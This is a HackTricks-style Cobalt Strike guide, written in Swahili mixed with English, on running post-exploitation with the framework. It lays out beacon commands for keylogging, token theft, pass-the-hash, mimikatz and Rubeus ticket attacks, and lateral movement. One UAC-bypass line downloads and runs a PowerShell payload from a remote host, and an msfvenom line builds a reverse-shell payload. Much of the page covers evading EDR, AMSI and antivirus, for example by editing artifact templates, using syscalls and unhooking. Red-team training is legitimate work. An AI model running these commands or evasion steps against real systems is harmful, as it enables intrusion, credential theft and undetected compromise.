# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua mahali pa kusikiliza, aina ya beacon ya kutumia (http, dns, smb...) na zaidi.

### Peer2Peer Listeners

Beacon za listeners hawa hazihitaji kuwasiliana na C2 moja kwa moja; zinaweza kuwasiliana nayo kupitia beacon nyingine.

`Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua TCP au SMB beacon.

* **TCP beacon itaweka listener kwenye port iliyochaguliwa**. Ili kuunganisha kwenye TCP beacon, tumia command `connect <ip> <port>` kutoka kwenye beacon nyingine.
* **SMB beacon itasikiliza kwenye pipename yenye jina lililochaguliwa**. Ili kuunganisha kwenye SMB beacon, unahitaji kutumia command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** kwa mafaili ya HTA
* **`MS Office Macro`** kwa document ya Office yenye macro
* **`Windows Executable`** kwa .exe, .dll au service .exe
* **`Windows Executable (S)`** kwa .exe, .dll au service .exe ya **stageless** (stageless ni bora kuliko staged kwa sababu ina IoCs chache)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Hii itatengeneza script/executable ya kudownload beacon kutoka Cobalt Strike katika formats kama: bitsadmin, exe, powershell na python.

#### Host Payloads

Ikiwa tayari una file unayotaka kuhost kwenye web server, nenda kwenye `Attacks -> Web Drive-by -> Host File` kisha uchague file ya kuhost na configuration ya web server.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Agent maalum inahitaji tu kuwasiliana na Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) ili kujisajili/check-in na kupokea tasks. Tekeleza URIs/headers/metadata crypto zilezile zilizofafanuliwa kwenye profile ili kutumia tena Cobalt Strike UI kwa tasking na output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (kwa mfano, `CustomBeacon.cna`) inaweza kufunga payload generation kwa beacon isiyo ya Windows ili operators waweze kuchagua listener na kuzalisha ELF payloads moja kwa moja kutoka kwenye GUI.
- Mifano ya Linux task handlers zinazowasilishwa kwa Team Server: `sleep`, `cd`, `pwd`, `shell` (kutekeleza commands kiholela), `ls`, `upload`, `download`, na `exit`. Hizi huendana na task IDs zinazotarajiwa na Team Server na lazima zitekelezwe server-side ili kurudisha output katika format sahihi.
- BOF support kwenye Linux inaweza kuongezwa kwa kupakia Beacon Object Files ndani ya process kwa kutumia [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (pia inaunga mkono BOFs za mtindo wa Outflank), hivyo kuruhusu modular post-exploitation kuendeshwa ndani ya context/privileges za implant bila kuanzisha processes mpya.<sup>[[2]](#references)[[3]](#references)</sup>
- Embed SOCKS handler ndani ya custom beacon ili kudumisha pivoting parity na Windows Beacons: operator anapoendesha `socks <port>`, implant inapaswa kufungua local proxy ya kupitisha operator tooling kupitia Linux host iliyo-compromise kwenda kwenye internal networks.

## Opsec

### Execute-Assembly

**`execute-assembly`** hutumia **sacrificial process** kwa kutumia remote process injection ili kutekeleza program iliyoonyeshwa. Hii inaonekana sana kwa sababu ili ku-inject ndani ya process hutumika Win APIs fulani ambazo kila EDR huzikagua. Hata hivyo, kuna custom tools zinazoweza kutumika kupakia kitu ndani ya process hiyo hiyo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Katika Cobalt Strike unaweza pia kutumia BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Agressor script `https://github.com/outflanknl/HelpColor` itaunda command ya `helpx` ndani ya Cobalt Strike ambayo itaweka rangi kwenye commands zinazoonyesha ikiwa ni BOFs (kijani), ikiwa ni Frok&Run (manjano) na kadhalika, au ikiwa ni ProcessExecution, injection au kadhalika (nyekundu). Hii husaidia kujua ni commands zipi zenye stealth zaidi.

### Act as the user

Unaweza kukagua events kama `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Kagua interactive logons zote ili kujua saa za kawaida za kazi.
- System EID 12,13 - Kagua frequency ya shutdown/startup/sleep.
- Security EID 4624/4625 - Kagua majaribio ya inbound NTLM yaliyo valid/invalid.
- Security EID 4648 - Event hii huundwa plaintext credentials zinapotumika kufanya logon. Ikiwa process imeizalisha, binary huenda ina credentials katika clear text ndani ya config file au ndani ya code.

Unapotumia `jump` kutoka cobalt strike, ni bora kutumia `wmi_msbuild` method ili process mpya ionekane kuwa legit zaidi.

### Use computer accounts

Ni kawaida kwa defenders kukagua weird behaviours zinazozalishwa na users na **kuondoa service accounts na computer accounts kama `*$` kwenye monitoring yao**. Unaweza kutumia accounts hizi kufanya lateral movement au privilege escalation.

### Use stageless payloads

Stageless payloads huwa na kelele kidogo kuliko staged payloads kwa sababu hazihitaji kupakua second stage kutoka kwa C2 server. Hii inamaanisha kwamba hazizalishi network traffic yoyote baada ya initial connection, hivyo uwezekano wa kugunduliwa na network-based defenses huwa mdogo.

### Tokens & Token Store

Kuwa mwangalifu unapoiba au kuzalisha tokens kwa sababu inaweza kuwa inawezekana kwa EDR ku-enumerate tokens zote za threads zote na kupata **token belonging to a different user** au hata SYSTEM ndani ya process.

Hii inaruhusu kuhifadhi tokens **per beacon** ili isiwe muhimu kuiba token ileile tena na tena. Hii ni muhimu kwa lateral movement au unapohitaji kutumia token iliyoibwa mara nyingi:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Unapofanya lateral movement, kwa kawaida ni bora **kuiba token kuliko kuzalisha mpya** au kufanya pass the hash attack.

### Guardrails

Cobalt Strike ina feature inayoitwa **Guardrails**, ambayo husaidia kuzuia matumizi ya commands au actions fulani yanayoweza kugunduliwa na defenders. Guardrails zinaweza kusanidiwa kuzuia commands maalum, kama `make_token`, `jump`, `remote-exec`, na nyingine zinazotumika kwa kawaida katika lateral movement au privilege escalation.

Zaidi ya hayo, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) pia ina baadhi ya checks na mawazo unayoweza kuzingatia kabla ya kutekeleza payload.

### Tickets encryption

Katika AD kuwa mwangalifu na encryption ya tickets. Kwa default, baadhi ya tools zitatumia RC4 encryption kwa Kerberos tickets, ambayo si salama kama AES encryption, na kwa default environments zilizosasishwa zitatumia AES. Hili linaweza kugunduliwa na defenders wanaofuatilia weak encryption algorithms.

### Avoid Defaults

Unapotumia Cobalt Stricke, kwa default SMB pipes zitakuwa na majina `msagent_####` na `"status_####"`. Badilisha majina hayo. Inawezekana kukagua majina ya pipes zilizopo kutoka Cobal Strike kwa command: `ls \\.\pipe\`

Zaidi ya hayo, katika SSH sessions pipe iitwayo `\\.\pipe\postex_ssh_####` huundwa. Ibadilishe kwa `set ssh_pipename "<new_name>";`.

Pia katika poext exploitation attack pipes `\\.\pipe\postex_####` zinaweza kubadilishwa kwa `set pipename "<new_name>"`.

Katika Cobalt Strike profiles unaweza pia kubadilisha vitu kama:

- Kuepuka kutumia `rwx`
- Jinsi process injection behavior inavyofanya kazi (ni APIs zipi zitatumika) katika block ya `process-inject {...}`
- Jinsi "fork and run" inavyofanya kazi katika block ya `post-ex {…}`
- Muda wa sleep
- Ukubwa wa juu wa binaries zitakazopakiwa kwenye memory
- Memory footprint na DLL content kwa kutumia block ya `stage {...}`
- Network traffic

### Bypass memory scanning

Baadhi ya ERDs hukagua memory kutafuta malware signatures zinazojulikana. Coblat Strike inaruhusu kubadilisha function ya `sleep_mask` kuwa BOF itakayoweza ku-encrypt backdoor kwenye memory.

### Noisy proc injections

Unapo-inject code kwenye process, kwa kawaida hii huwa na kelele sana kwa sababu **hakuna process ya kawaida inayofanya action hii na kwa sababu njia za kufanya hivi ni chache sana**. Kwa hiyo, inaweza kugunduliwa na behaviour-based detection systems. Zaidi ya hayo, inaweza pia kugunduliwa na EDRs zinazochanganua network kutafuta **threads zenye code ambayo haipo kwenye disk** (ingawa processes kama browsers zinazotumia JIT huwa zina hali hii mara kwa mara). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Unapozalisha process mpya, ni muhimu **kudumisha regular parent-child** relationship kati ya processes ili kuepuka detection. Ikiwa svchost.exec inaendesha iexplorer.exe, itaonekana ya kutia shaka, kwa sababu svchost.exe si parent wa iexplorer.exe katika mazingira ya kawaida ya Windows.

Beacon mpya inapozalishwa katika Cobalt Strike, kwa default process inayotumia **`rundll32.exe`** huundwa ili kuendesha listener mpya. Hii si stealthy sana na inaweza kugunduliwa kwa urahisi na EDRs. Zaidi ya hayo, `rundll32.exe` huendeshwa bila args yoyote, jambo linaloifanya iwe ya kutia shaka zaidi.

Kwa command ifuatayo ya Cobalt Strike, unaweza kubainisha process tofauti ya kuzalisha beacon mpya, na kuifanya isiwe rahisi kugunduliwa:
```bash
spawnto x86 svchost.exe
```
Unaweza pia kubadilisha setting hii **`spawnto_x86` na `spawnto_x64`** kwenye profile.

### Ku-proxy traffic ya attackers

Attackers wakati mwingine watahitaji kuweza kuendesha tools locally, hata kwenye mashine za Linux, na kufanya traffic ya victims ifikie tool hiyo (mfano NTLM relay).

Aidha, wakati mwingine ili kufanya pass-the-hash au pass-the-ticket attack, ni stealthier kwa attacker **kuongeza hash au ticket hiyo kwenye LSASS process yake mwenyewe** locally, kisha kufanya pivot kupitia hiyo badala ya kurekebisha LSASS process ya mashine ya victim.

Hata hivyo, unahitaji kuwa **mwangalifu na traffic inayozalishwa**, kwa sababu unaweza kuwa unatuma traffic isiyo ya kawaida (Kerberos?) kutoka kwenye backdoor process yako. Kwa hili unaweza kufanya pivot kwenda kwenye browser process (ingawa unaweza kugunduliwa kwa kujidunga kwenye process, kwa hiyo fikiria njia ya stealth ya kufanya hivyo).


### Kuepuka AVs

#### AV/AMSI/ETW Bypass

Angalia ukurasa:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Kwa kawaida kwenye `/opt/cobaltstrike/artifact-kit` unaweza kupata code na templates zilizotengenezwa awali (kwenye `/src-common`) za payloads ambazo cobalt strike itatumia kutengeneza binary beacons.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na backdoor iliyotengenezwa (au template iliyocompilewa pekee), unaweza kubaini kinachosababisha defender kutoa alert. Kwa kawaida huwa ni string. Kwa hiyo unaweza tu kurekebisha code inayotengeneza backdoor ili string hiyo isionekane kwenye binary ya mwisho.

Baada ya kurekebisha code, endesha tu `./build.sh` kutoka kwenye directory hiyo hiyo na unakili folder ya `dist-pipe/` kwenye Windows client katika `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Usisahau kupakia script ya aggressive `dist-pipe\artifact.cna` ili kuielekeza Cobalt Strike itumie resources zilizo kwenye disk tunazotaka, badala ya zile zilizopakiwa.

#### Resource Kit

Folder ya ResourceKit ina templates za payloads za Cobalt Strike zinazotegemea script, zikiwemo PowerShell, VBA na HTA.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na templates, unaweza kubaini ni sehemu gani Defender (AMSI katika hali hii) haikubali na kuibadilisha:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Kwa kurekebisha mistari iliyotambuliwa, unaweza kutengeneza template ambayo haitagunduliwa.

Usisahau kupakia script ya aggressive `ResourceKit\resources.cna` ili kuielekeza Cobalt Strike kutumia resources kutoka kwenye disk tunazotaka, badala ya zile zilizopakiwa.

#### Function hooks | Syscall

Function hooking ni mbinu inayotumika sana na ERDs kugundua shughuli hasidi. Cobalt Strike hukuruhusu bypass hooks hizi kwa kutumia **syscalls** badala ya standard Windows API calls kwa kutumia config ya **`None`**, au kutumia toleo la **`Nt*`** la function kwa setting ya **`Direct`**, au kuruka tu juu ya function ya **`Nt*`** kwa option ya **`Indirect`** kwenye malleable profile. Kulingana na mfumo, option moja inaweza kuwa stealthier kuliko nyingine.

Hii inaweza kuwekwa kwenye profile au kwa kutumia command **`syscall-method`**

Hata hivyo, hii pia inaweza kuwa noisy.

Option moja inayotolewa na Cobalt Strike ya kubypass function hooks ni kuondoa hooks hizo kwa kutumia: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Unaweza pia kuangalia ni functions zipi zimehookiwa kwa kutumia [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) au [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Marejeo

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Uchambuzi wa Unit42 kuhusu usimbaji fiche wa metadata ya Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diary ya SANS ISC kuhusu traffic ya Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
